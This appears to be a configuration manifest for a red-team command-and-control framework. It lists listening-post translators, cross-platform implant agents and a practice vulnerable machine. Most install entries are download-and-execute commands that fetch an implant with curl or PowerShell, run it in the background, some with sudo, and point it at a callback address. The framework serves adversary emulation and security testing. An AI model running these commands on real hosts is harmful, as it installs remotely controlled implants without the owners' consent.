translators:
  metadata:
    description: Extra Operator listening posts for redirectors
    purpose: redirector
    build: |
      tar zcf DST.PATH/ftp.tar.gz -C SRC.PATH ftp && tar zcf DST.PATH/grpc.tar.gz -C SRC.PATH grpc && \
      zip -r DST.PATH/ftp-source.zip SRC.PATH/ftp && zip -r DST.PATH/grpc-source.zip SRC.PATH/grpc;
  payloads:
    ftp.tar.gz:
      install: |
        mkdir -p /tmp/translators && \
        curl 'PAYLOAD.URL' > /tmp/translators/ftp.tar.gz && \
        tar xzf /tmp/translators/ftp.tar.gz -C /tmp/translators && \
        sudo pip3 install -r /tmp/translators/ftp/requirements.txt && \
        nohup sudo python3 /tmp/translators/ftp/server.py &
    grpc.tar.gz:
      install: |
        mkdir -p /tmp/translators && \
        curl 'PAYLOAD.URL' > /tmp/translators/grpc.tar.gz && \
        tar xzf /tmp/translators/grpc.tar.gz -C /tmp/translators && \
        sudo pip3 install -r /tmp/translators/grpc/requirements.txt && \
        nohup sudo python3 /tmp/translators/grpc/server.py &
    ftp-source.zip: {}
    grpc-source.zip: {}

pneuma:
  metadata:
    description: The default open-source agent written in GoLang
    purpose: agent
    build: |
      GOOS=darwin go build -ldflags="-s -w -X main.randomHash=$(openssl rand -base64 16)" -o DST.PATH/pneuma-darwin SRC.PATH/main.go && \
      GOOS=linux go build -ldflags="-s -w -X main.randomHash=$(openssl rand -base64 16)" -o DST.PATH/pneuma-linux SRC.PATH/main.go && \
      GOOS=windows go build -ldflags="-s -w -X main.randomHash=$(openssl rand -base64 16)" -o DST.PATH/pneuma-windows.exe SRC.PATH/main.go && \
      git archive --format zip --output "DST.PATH/pneuma-source.zip" master;
    platforms:
      - linux
      - windows
      - darwin
    protocols:
      - tcp
      - http
      - udp
      - grpc
  payloads:
    pneuma-linux:
      install: |
        curl 'PAYLOAD.URL' > /tmp/pneuma && chmod +x /tmp/pneuma && nohup /tmp/pneuma -name $(echo $HOSTNAME) -address #{callback} -range "Cloud" &
    pneuma-windows.exe:
      install: |
        mkdir "c:\aws\download"
        Set-Location "c:\aws\download"
        $wc = New-Object System.Net.WebClient
        $myurl="PAYLOAD.URL"
        $wc.DownloadFile("$myurl","C:\aws\download\pneuma-windows.exe")
        Start-Process -FilePath C:\aws\download\pneuma-windows.exe -ArgumentList "-name $env:COMPUTERNAME -address #{callback} -range Cloud"
    pneuma-darwin: {}
    pneuma-source.zip: {}

schism:
  metadata:
    description: Simple FTP agent (requires a translator)
    purpose: agent
    build: |
      zip -r DST.PATH/schism-source.zip SRC.PATH && \
      cp SRC.PATH/* DST.PATH;
    platforms: 
      - windows
      - linux
      - darwin
    protocols:
      - ftp
  payloads:
    schism.py:
      install: |
        curl 'PAYLOAD.URL' > /tmp/schism && chmod +x /tmp/schism && pip install ftplib && nohup /tmp/schism -address #{callback} &
    schism-source.zip: {}

nicodemus:
  metadata:
    description: Nicodemus is a cross-platform Nim implant written by Roger Johnston (VVX7 - https://github.com/VVX7/nicodemus).
    purpose: agent
    build: |
      docker run --rm -v REPO.CWD:/usr/local/src -w /usr/local/src/payloads/src/nicodemus chrishellerappsian/docker-nim-cross:latest ./build-docker.sh;
      cp SRC.PATH/payloads/* DST.PATH && \
      git archive --format zip --output "DST.PATH/nicodemus-source.zip" master;
    platforms:
      - windows
      - linux
      - darwin
    protocols:
      - http
      - tcp
      - udp
  payloads:
    nicodemus-darwin: {}
    nicodemus-linux: {}
    nicodemus-windows.exe: {}
    nicodemus-source.zip: {}

ctf:
  metadata:
    description: Create a vulnerable environment to practice against
    purpose: virtualmachine
    build: |
      zip -r DST.PATH/ctf-source.zip SRC.PATH && \
      cp SRC.PATH/vulnerable.sh DST.PATH
    platforms: 
      - linux
  payloads:
    vulnerable.sh:
      install: curl 'PAYLOAD.URL' > tmp/vulnerable.sh && chmod +x /tmp/vulnerable.sh && sudo ./vulnerable.sh
    ctf-source.zip: {}
